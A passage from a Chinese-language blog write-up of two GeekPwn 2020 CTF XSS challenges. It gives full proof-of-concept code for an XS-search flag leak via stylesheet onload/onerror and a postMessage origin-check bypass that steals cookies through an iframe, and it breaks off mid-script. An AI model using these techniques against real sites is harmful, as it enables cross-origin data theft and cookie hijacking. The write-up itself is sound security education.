@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#222">
+  <link rel="manifest" href="/images/site.webmanifest">
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://cs.yscale.cf').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: true,
+    comments: {"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="GeekPwn 2020 的云安全热身赛结束了，一共 2 天，把能做的 Web 都做了，比赛的 Web 题考察面比较古怪，让我这种 Web 狗感到极度不舒适. 一共 4 道 Web 题，一题签到类的 Web 题，一题假 Web 题（rtmpsrv 0day emmm….），剩下两道 XSS 相关的题我做了出来，其中一道颇为巧妙，并且有潜在的用途，写个文章记录一下.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[GeekPwn 2020] 云安全热身赛两道 XSS 题解">
+<meta property="og:url" content="https://cs.yscale.cf/2020/07/13/ctf-geekpwn-cloudsec-xss/index.html">
+<meta property="og:site_name" content="yscale&#39;s CS blog">
+<meta property="og:description" content="GeekPwn 2020 的云安全热身赛结束了，一共 2 天，把能做的 Web 都做了，比赛的 Web 题考察面比较古怪，让我这种 Web 狗感到极度不舒适. 一共 4 道 Web 题，一题签到类的 Web 题，一题假 Web 题（rtmpsrv 0day emmm….），剩下两道 XSS 相关的题我做了出来，其中一道颇为巧妙，并且有潜在的用途，写个文章记录一下.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cs.yscale.cf/2020/07/13/ctf-geekpwn-cloudsec-xss/bot.png">
+<meta property="og:image" content="https://cs.yscale.cf/2020/07/13/ctf-geekpwn-cloudsec-xss/link-github.png">
+<meta property="og:image" content="https://cs.yscale.cf/2020/07/13/ctf-geekpwn-cloudsec-xss/link-github-404.png">
+<meta property="og:image" content="https://cs.yscale.cf/2020/07/13/ctf-geekpwn-cloudsec-xss/final.png">
+<meta property="og:image" content="https://cs.yscale.cf/2020/07/13/ctf-geekpwn-cloudsec-xss/umsg-vue.png">
+<meta property="og:image" content="https://cs.yscale.cf/2020/07/13/ctf-geekpwn-cloudsec-xss/umsg-bot.png">
+<meta property="og:image" content="https://cs.yscale.cf/2020/07/13/ctf-geekpwn-cloudsec-xss/umsg-src-message.png">
+<meta property="og:image" content="https://cs.yscale.cf/2020/07/13/ctf-geekpwn-cloudsec-xss/umsg-subdomain.png">
+<meta property="og:image" content="https://cs.yscale.cf/2020/07/13/ctf-geekpwn-cloudsec-xss/umsg-final.png">
+<meta property="article:published_time" content="2020-07-12T17:07:32.000Z">
+<meta property="article:modified_time" content="2020-07-12T19:29:00.880Z">
+<meta property="article:author" content="yscale">
+<meta property="article:tag" content="GeekPwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cs.yscale.cf/2020/07/13/ctf-geekpwn-cloudsec-xss/bot.png">
+
+<link rel="canonical" href="https://cs.yscale.cf/2020/07/13/ctf-geekpwn-cloudsec-xss/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>[GeekPwn 2020] 云安全热身赛两道 XSS 题解 | yscale's CS blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yscale's CS blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">anything about CS</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://cs.yscale.cf/2020/07/13/ctf-geekpwn-cloudsec-xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars1.githubusercontent.com/u/13887988">
+      <meta itemprop="name" content="yscale">
+      <meta itemprop="description" content="yscale's CS blog">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yscale's CS blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [GeekPwn 2020] 云安全热身赛两道 XSS 题解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-07-13 01:07:32 / Modified: 03:29:00" itemprop="dateCreated datePublished" datetime="2020-07-13T01:07:32+08:00">2020-07-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Security/" itemprop="url" rel="index">
+                    <span itemprop="name">Security</span>
+                  </a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Security/Web-Security/" itemprop="url" rel="index">
+                    <span itemprop="name">Web Security</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>GeekPwn 2020 的云安全热身赛结束了，一共 2 天，把能做的 Web 都做了，比赛的 Web 题考察面比较古怪，让我这种 Web 狗感到极度不舒适. 一共 4 道 Web 题，一题签到类的 Web 题，一题假 Web 题（<code>rtmpsrv</code> 0day emmm….），剩下两道 XSS 相关的题我做了出来，其中一道颇为巧妙，并且有潜在的用途，写个文章记录一下.<br><a id="more"></a></p>
+<h1 id="noxss-2020"><a href="#noxss-2020" class="headerlink" title="noxss 2020"></a>noxss 2020</h1><h2 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h2><p>本题目有两个服务：</p>
+<ul>
+<li>服务 1：<a href="http://noxss2020.cal1.cn:3000/" target="_blank" rel="noopener">http://noxss2020.cal1.cn:3000/</a></li>
+<li>服务 2：<a href="http://noxss2020-bot.cal1.cn:1337/" target="_blank" rel="noopener">http://noxss2020-bot.cal1.cn:1337/</a></li>
+</ul>
+<p>服务 1 运行着一个 flask 应用，源代码 <code>app.py</code> 已经由题目附件给出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, Response</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> getenv</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">DATASET = &#123;</span><br><span class="line">    <span class="number">114</span>: <span class="string">'514'</span>,</span><br><span class="line">    <span class="number">810</span>: <span class="string">'8931919'</span>,</span><br><span class="line">    <span class="number">2017</span>: <span class="string">'https://blog.cal1.cn/post/RCTF%202017%20rCDN%20%26%20noxss%20writeup'</span>,</span><br><span class="line">    <span class="number">2019</span>: <span class="string">'https://hackmd.io/IlzCicHXSN-MXl2JLCYr0g?view'</span>,</span><br><span class="line">    <span class="number">2020</span>: getenv(<span class="string">'NOXSS_FLAG'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_host</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.host != getenv(<span class="string">'NOXSS_HOST'</span>) <span class="keyword">or</span> request.remote_addr != getenv(<span class="string">'BOT_IP'</span>):</span><br><span class="line">        <span class="keyword">return</span> Response(status=<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/search")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_handler</span><span class="params">()</span>:</span></span><br><span class="line">    keyword = request.args.get(<span class="string">'keyword'</span>)</span><br><span class="line">    <span class="keyword">if</span> keyword <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(DATASET)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> DATASET:</span><br><span class="line">            <span class="keyword">if</span> keyword <span class="keyword">in</span> DATASET[i]:</span><br><span class="line">                ret[i] = DATASET[i]</span><br><span class="line">        <span class="keyword">return</span> jsonify(ret), <span class="number">200</span> <span class="keyword">if</span> len(ret) <span class="keyword">else</span> <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_security_headers</span><span class="params">(resp)</span>:</span></span><br><span class="line">    resp.headers[<span class="string">'X-Frame-Options'</span>] = <span class="string">'sameorigin'</span></span><br><span class="line">    resp.headers[<span class="string">'Content-Security-Policy'</span>] = <span class="string">'default-src \'self\'; frame-src https://www.youtube.com'</span></span><br><span class="line">    resp.headers[<span class="string">'X-Content-Type-Options'</span>] = <span class="string">'nosniff'</span></span><br><span class="line">    resp.headers[<span class="string">'Referrer-Policy'</span>] = <span class="string">'same-origin'</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">3000</span>, )</span><br></pre></td></tr></table></figure>
+<p>限制了 IP 访问，可以看到 flag 位于一个字典中，相关的静态资源在本题中没有太大用处，故不再提及.</p>
+<p>服务 2 是一个 BOT，其 IP 对应了上方的 <code>getenv(&#39;BOT_IP&#39;)</code>：</p>
+<img src="/2020/07/13/ctf-geekpwn-cloudsec-xss/bot.png" class="" title="BOT 服务">
+<p>它会通过 <code>selenium</code> 无头浏览器访问用户输入的 URL，而我们需要做的就是传入一个链接，利用 BOT 访问它，来拿到服务端应用的 flag.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Bot: Google Chrome Version 83.0.4103.116 (Official Build) (64-bit)</span></span><br><span class="line">driver.get(<span class="string">'http://www.example.com/'</span>)</span><br><span class="line">driver.implicitly_wait(<span class="number">3</span>)</span><br><span class="line">driver.execute_script(<span class="string">f"let a=document.createElement('a');a.id='clickme';a.text='clickme';a.target='_blank';a.href=atob('<span class="subst">&#123;b64encode(payload).decode(<span class="string">'utf-8'</span>)&#125;</span>');document.body.appendChild(a)"</span>)</span><br><span class="line">driver.implicitly_wait(<span class="number">3</span>)</span><br><span class="line">driver.find_element_by_xpath(<span class="string">'//*[@id="clickme"]'</span>).click()</span><br><span class="line">time.sleep(<span class="number">30</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="题目思路"><a href="#题目思路" class="headerlink" title="题目思路"></a>题目思路</h2><p>首先在上述 <code>app.py</code> 中，我们容易发现一个事实：<strong>跨域策略十分苛刻</strong>，因此将其通过 <code>iframe</code> 引入是不可能的；接着注意到路由 <code>/search</code> 的功能，是针对参数 <code>keyword</code> 在字典中查找所有包含 <code>keyword</code> 的值，过滤成一个新字典输出，如果没有找到，状态码返回 404，</p>
+<p>访问一下字典里的链接，发现可能是命题人留下的提示.</p>
+<h3 id="链接-2017"><a href="#链接-2017" class="headerlink" title="链接 2017"></a>链接 2017</h3><p>对于字典中 <code>key</code> 为 2017 的一项，我们发现它是一道利用 CSS 注入进行内容嗅探的 XSS 题的 writeup，但是对于本题而言，没有任何注入点，因此绝对不是这个方法.</p>
+<h3 id="链接-2019"><a href="#链接-2019" class="headerlink" title="链接 2019"></a>链接 2019</h3><p>对于字典中 <code>key</code> 为 2019 的一项，也是一个 XSS 题的 writeup，利用 CSS 的 <code>[attr^=value]</code> 选择器进行前缀查找并设置宽度样式，使得页面出现滚动条，随即再设置滚动条的样式，其中利用了 <code>background</code> 和 <code>url</code> 来达到远程请求，但是对于本题而言，没有任何办法将目标的 <code>/search</code> 页面嵌入网页内，因此也绝对不是这个方法.</p>
+<h3 id="两个链接的用意"><a href="#两个链接的用意" class="headerlink" title="两个链接的用意"></a>两个链接的用意</h3><p>那么为什么要放这两个链接呢？事实上，我在做完之后仔细琢磨，发现这两道题分别给出了一个<strong>线索</strong>：</p>
+<ul>
+<li><code>link</code> 标签</li>
+<li>前缀查找</li>
+</ul>
+<h3 id="绕过其中一个限制"><a href="#绕过其中一个限制" class="headerlink" title="绕过其中一个限制"></a>绕过其中一个限制</h3><p>我们注意到，<code>app.py</code> 发送的一个限制头是 <code>X-Content-Type-Options: nosniff</code>，事实上这一限制可直接绕过：在 Chrome 系的浏览器，出于某些原因，大部分资源不会直接受到目标 <code>X-Content-Type-Options: nosniff</code> 的约束，但是由于默认的安全策略，仍然会被 block，但不会产生 error，</p>
+<h3 id="小数字，大影响"><a href="#小数字，大影响" class="headerlink" title="小数字，大影响"></a>小数字，大影响</h3><p>之前我们注意到了，路由 <code>/search</code> 在查找到时，会正常返回状态，即 200；如果没找到，则返回 404. 事实上，可以做一个小测试</p>
+<p>测试 1：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://github.com/"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/2020/07/13/ctf-geekpwn-cloudsec-xss/link-github.png" class="" title="测试 1 效果"></p>
+<p>测试 2:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://github.com/404/404/404"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/2020/07/13/ctf-geekpwn-cloudsec-xss/link-github-404.png" class="" title="测试 2 效果"></p>
+<p>事实上，由此可以联想到相关的事件，经过相关测试发现 404 会触发 <code>onerror</code> 而 200 尽管被 block 了，但是会正常触发 <code>onload</code>，基于此我们就可以实现前缀查找</p>
+<h2 id="题目-POC"><a href="#题目-POC" class="headerlink" title="题目 POC"></a>题目 POC</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.flag = <span class="string">"flag&#123;"</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">const</span> CHARSET = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!@#$%^&amp;*()_+-=[]:&#123;&#125;"</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">guess</span><span class="params">(charset, i)</span> </span>&#123;</span></span><br><span class="line">      if(i &gt;= charset.length) &#123;</span><br><span class="line"><span class="javascript">        fetch(<span class="string">`/flag_is_<span class="subst">$&#123;flag&#125;</span>`</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> l = <span class="built_in">document</span>.createElement(<span class="string">'link'</span>);</span></span><br><span class="line"><span class="actionscript">      l.rel = <span class="string">'stylesheet'</span>;</span></span><br><span class="line"><span class="javascript">      l.href = <span class="string">`http://noxss2020.cal1.cn:3000/search?keyword=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(flag + charset[i])&#125;</span>`</span>;</span></span><br><span class="line"><span class="javascript">      l.onload = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line">        flag += charset[i];</span><br><span class="line"><span class="javascript">        fetch(<span class="string">`/flag_is_<span class="subst">$&#123;flag&#125;</span>`</span>);</span></span><br><span class="line">        guess(charset, 0);</span><br><span class="line">      &#125;;</span><br><span class="line"><span class="javascript">      l.onerror = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line">        guess(charset, i + 1);</span><br><span class="line">      &#125;;</span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.head.append(l);</span></span><br><span class="line">    &#125;</span><br><span class="line">    guess(CHARSET, 0);</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>提交效果如下</p>
+<img src="/2020/07/13/ctf-geekpwn-cloudsec-xss/final.png" class="" title="提交效果">
+<h2 id="潜在用途"><a href="#潜在用途" class="headerlink" title="潜在用途"></a>潜在用途</h2><p>基于此利用客户端的计算资源，对某些网站进行 URL 扫描，如果未来这个跨域问题没有解决的话，应该还是有很大利用空间的.</p>
+<h1 id="umsg"><a href="#umsg" class="headerlink" title="umsg"></a>umsg</h1><h2 id="题目概述-1"><a href="#题目概述-1" class="headerlink" title="题目概述"></a>题目概述</h2><p>本题目同样有两个服务：</p>
+<ul>
+<li>服务 1：<a href="http://umsg.iffi.top:3000/" target="_blank" rel="noopener">http://umsg.iffi.top:3000/</a></li>
+<li>服务 2：<a href="http://umsg-bot.iffi.top:2333/" target="_blank" rel="noopener">http://umsg-bot.iffi.top:2333/</a></li>
+</ul>
+<p>服务 1 运行着一个 Vue 前端，似乎没有和后端通信的操作.</p>
+<img src="/2020/07/13/ctf-geekpwn-cloudsec-xss/umsg-vue.png" class="" title="Vue 前端">
+<p>服务 2 是一个 BOT，仍然使用 <code>selenium</code>.</p>
+<img src="/2020/07/13/ctf-geekpwn-cloudsec-xss/umsg-bot.png" class="" title="BOT 服务">
+<p>其会携带一个 cookie 访问输入的 URL，而这个 cookie 内容就是 flag，当然，该 cookie 只作用在 umsg.iffi.top 上，因此需要 XSS 实现信息盗取.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Bot: Google Chrome Version 83.0.4103.116 (Official Build) (64-bit)</span></span><br><span class="line">driver.get(<span class="string">'http://umsg.iffi.top:3000/'</span>)</span><br><span class="line">driver.implicitly_wait(<span class="number">3</span>)</span><br><span class="line">driver.add_cookie(&#123;<span class="string">'name'</span>: <span class="string">'flag'</span>,<span class="string">'value'</span>: os.getenv(<span class="string">'UMSG_FLAG'</span>), <span class="string">'domain'</span>: <span class="string">'umsg.iffi.top'</span>&#125;)</span><br><span class="line">driver.implicitly_wait(<span class="number">3</span>)</span><br><span class="line">driver.get(payload)</span><br><span class="line">time.sleep(<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="题目思路-1"><a href="#题目思路-1" class="headerlink" title="题目思路"></a>题目思路</h2><p>这个前端肯定藏了东西，直接把整个页面相关的静态文件都 dump 下来，因为这些脚本都是 <code>webpack</code> 的 bundle，直接利用 Prettier 美化一下，然后审计，一开始觉得这边没有后端交互的话，可能是前端藏着什么路由，且该路由有 XSS 注入点，结果怎么找也找不到.</p>
+<p>再三地审计，发现了一点蛛丝马迹，位于 <code>index</code> 的 bundle 中</p>
+<img src="/2020/07/13/ctf-geekpwn-cloudsec-xss/umsg-src-message.png" class="" title="一点蛛丝马迹">
+<p>这边有监听 <code>message</code> 事件，并且其具备接受 <code>postMessage</code> 发送的消息的能力，此时就豁然开朗了，我们只需要把这个网页放到一个框架中即可与之通信，不过并不能高兴的太早，这里对 <code>origin</code> 做出了限制，乍看好像只能限制在 <code>umsg.iffi.top</code> 这个域下，实际上只要域名以 <code>umsg.iffi.top</code> 开头就可以了，即刻建一个子域名.</p>
+<img src="/2020/07/13/ctf-geekpwn-cloudsec-xss/umsg-subdomain.png" class="" title="子域名绕过 origin 限制">
+<p>这里还是要理清楚一下思路的，因为 cookie 只在框架中生效，因此需要我们能让框架执行任意代码，或者说让框架把框架内的 <code>document.cookie</code> 利用 <code>postMessage</code> 回传回来.</p>
+<p>因此除了主页面需要向框架 <code>postMessage</code> 以载入 payload 之外，还需要框架 <code>postMessage</code> 将相关结果带回.</p>
+<h2 id="题目-POC-1"><a href="#题目-POC-1" class="headerlink" title="题目 POC"></a>题目 POC</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://umsg.iffi.top:3000/"</span> <span class="attr">id</span>=<span class="string">"xss"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> frame = <span class="built_in">document</span>.querySelector(<span class="string">"#xss"</span>);</span></span><br><span class="line"><span class="actionscript">            frame.contentWindow.postMessage(&#123; action: <span class="string">"append"</span>, payload: <span class="string">'&lt;img src="x" onerror="window.parent.postMessage(&#123;payload: document.cookie&#125;, \'*\');"&gt;'</span> &#125;, <span class="string">"*"</span>);</span></span><br><span class="line">        &#125;, 1000);</span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, (e) =&gt; &#123;</span></span><br><span class="line"><span 